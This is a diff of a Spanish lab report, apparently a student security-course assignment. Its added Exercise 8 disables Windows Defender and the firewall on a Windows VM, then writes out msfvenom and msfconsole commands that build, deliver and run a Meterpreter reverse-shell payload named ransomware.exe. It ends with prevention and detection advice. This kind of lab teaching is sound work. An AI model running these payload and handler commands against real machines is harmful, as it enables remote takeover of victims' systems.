@@ -38,11 +38,11 @@ issued for his arrest, Mitnick fled, becoming a fugitive for two-and-a-half year
 \section*{Ejercicio 5: El gran secreto dentro de una imagen}
 
 \begin{tcolorbox}[title=Info. VM 1]
-OS: Kali GNU/Linux Rolling x86\_64
-Kernel version: 6.19.1+kali-amd64
-Núcleos: 2 x Intel Core i7-9750H
-RAM: 2GB
-IP: 192.168.1.230
+OS: Kali GNU/Linux Rolling x86\_64\\
+Kernel version: 6.19.1+kali-amd64\\
+Núcleos: 2 x Intel Core i7-9750H\\
+RAM: 2GB\\
+IP: 192.168.1.230\\
 \end{tcolorbox}
 
 Para este ejercicio se utilizó la imágen \texttt{mao-shi.jpg} indicada en el repositorio de la tarea y
@@ -112,11 +112,11 @@ fuente o un conjunto limitado de fuentes y que son más fáciles de identificar 
 \section*{Ejercicio 7: ¡Hey! No mires más de lo necesario}
 
 \begin{tcolorbox}[title=Info. VM 2]
-OS: Debian GNU/Linux 13 (trixie)
-Kernel version: 6.12.86+deb13-amd64
-Núcleos: 2 x Intel Core i7-9750H
-RAM: 2GB
-IP: 192.168.1.231
+OS: Debian GNU/Linux 13 (trixie)\\
+Kernel version: 6.12.86+deb13-amd64\\
+Núcleos: 2 x Intel Core i7-9750H\\
+RAM: 2GB\\
+IP: 192.168.1.231\\
 \end{tcolorbox}
 
 Se hacen las configuraciones mencionadas en la descripción de la tarea para la configuración de la VM Debian.
@@ -162,3 +162,120 @@ ya que el tráfico ssh está cifrado, por lo que no se puede obtener informació
 
 Esto concuerda con las diferencias de seguridad entre \texttt{telnet}, que transmite la información en 
 texto plano, y \texttt{ssh}, que cifra la información transmitida.
+
+\section{Ejercicio 8: Un clic, una sentencia}
+
+\begin{tcolorbox}[title=Info. VM 3]
+OS: Windows 11 24H2\\
+Núcleos: 4 x Intel Core i7-9750H\\
+RAM: 4GB\\
+IP: 192.168.1.238
+\end{tcolorbox}
+
+Lo primero que hacemos es desactivar el firewall de Windows asi como (parcialemente) Windows Defender.
+Sin embargo, algunas opciones del anterior no se desactivan directamente con el segundo comando
+ejecutado, por lo que es necesario revisar manualmente la configuración de Windows Defender para asegurarnos 
+de que las opciones de protección en tiempo real, protección basada en la nube y envío automático de muestras 
+estén desactivadas.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\textwidth]{../../Ejercicio 8/firewall_defender.png}
+    \caption{Desactivación de Windows Defender}
+    \label{fig:firewall-defender}
+\end{figure}
+
+
+Ahora instalamos y configuramos \texttt{ssh} en la VM de Windows desde la terminal para inicializar
+desde el arranque de la VM.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\textwidth]{../../Ejercicio 8/ssh_win11.png}
+    \caption{Instalación y configuración de ssh en Windows}
+    \label{fig:sshd-windows}
+\end{figure}
+
+Hacemos lo mismo en la VM atacante de Kali:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\textwidth]{../../Ejercicio 8/ssh_kali.png}
+    \caption{Instalación y configuración de ssh en Kali}
+    \label{fig:sshd-kali}
+\end{figure}
+
+
+Cambiamos las direcciones IP de ambas máquinas dentro del a misma red interna. Para
+Kali se asigna la IP \texttt{10.0.0.1} y para Windows se asigna la IP \texttt{10.0.0.2}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\textwidth]{../../Ejercicio 8/cambio_IPs.png}
+    \caption{Configuración de IPs en ambas máquinas}
+    \label{fig:ip-config}
+\end{figure}
+
+Ahora, desde una terminal de Kali, hacemos la conexión ssh a Windows y ejecutamos algún comando
+para verificar que la conexión funciona correctamente. En este caso se ejecuta \texttt{systeminfo} 
+para obtener información del sistema operativo de Windows.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\textwidth]{../../Ejercicio 8/ssh_info_win.png}
+    \caption{Conexión ssh desde Kali a Windows}
+    \label{fig:sshd-connection}
+\end{figure}
+
+En otra terminal procedemos a crear el payload de ransomware con \texttt{msfvenom}. El comando usado para hacerlo, 
+considerando la IP de Kali, fue \texttt{msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.0.0.1
+LPORT=4444 -f exe > /tmp/ransomware.exe}. 
+
+Luego, para enviar el archivo, se usó el comando\\
+\texttt{scp kali@kali:/tmp/ransomware.exe vmware@10.0.0.2:C:/Users/vmware/Desktop/}.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\textwidth]{../../Ejercicio 8/virus_scp.png}
+    \caption{Creación del payload con msfvenom y envío a Windows con scp}
+    \label{fig:msfvenom-scp}
+\end{figure}
+
+Aprovechando la terminal abierta con la conexión ssh a Windows, se ejecuta el payload con 
+\texttt{./Desktop/ransomware.exe}, mientras que en la terminal donde recién enviamos el archivo
+se ejecuta el comando \texttt{msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse\_tcp; 
+set LHOST 10.0.0.1; set LPORT 4444; exploit"}
+
+La siguiente imágen muestra la ejecución del payload en Windows y la conexión establecida con Kali. Ejecutamos
+el comando \texttt{sysinfo} para verificar que la conexión funciona correctamente.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\textwidth]{../../Ejercicio 8/payload.png}
+    \caption{Ejecución del payload en Windows y conexión establecida con Kali}
+    \label{fig:payload-connection}
+\end{figure}
+
+\subsection{¿Qué medidas de seguridad se podrían implementar para prevenir este tipo de ataques de ransomware?}
+
+La principal y más obvia es no desactivar Windows Defender ni el firewall de Windows, ya que estas herramientas 
+están diseñadas para detectar y bloquear este tipo de amenazas a nivel de sistema operativo. Usar soluciones de 
+seguridad avanzadas como antivirus, antimalware y sistemas de detección de intrusiones también ayudan a tener
+una capa adicional de protección contra este tipo de ataques.
+
+Luego, es importante mantener el sistema operativo y todas las aplicaciones actualizadas, ya que las actualizaciones 
+suelen incluir parches de seguridad que corrigen vulnerabilidades que podrían ser explotadas por ransomware. 
+
+Una política de consientización y capacitación de los empleados también es crucial, ya que muchos ataques de 
+ransomware se inician a través de correos electrónicos de phishing o enlaces maliciosos. 
+
+Además, implementar una estrategia de respaldo regular y segura puede ayudar a mitigar el impacto de un ataque 
+de ransomware, permitiendo restaurar los datos sin pagar el rescate. 
+
+\subsection{¿Cómo se podría detectar y mitigar un ataque de ransomware en una red empresarial?}
+
+Para detectar un ataque de ransomware, se pueden utilizar sistemas de detección de intrusiones (IDS) y 
+sistemas de prevención de intrusiones (IPS) que monitorean el tráfico de red en busca de patrones sospechosos
+o comportamientos anómalos. También se pueden implementar soluciones de seguridad que analicen el comportamiento 
+de los archivos y procesos en busca de actividades relacionadas con ransomware, como la encriptación masiva de 
+archivos o la comunicación con servidores de comando y control.
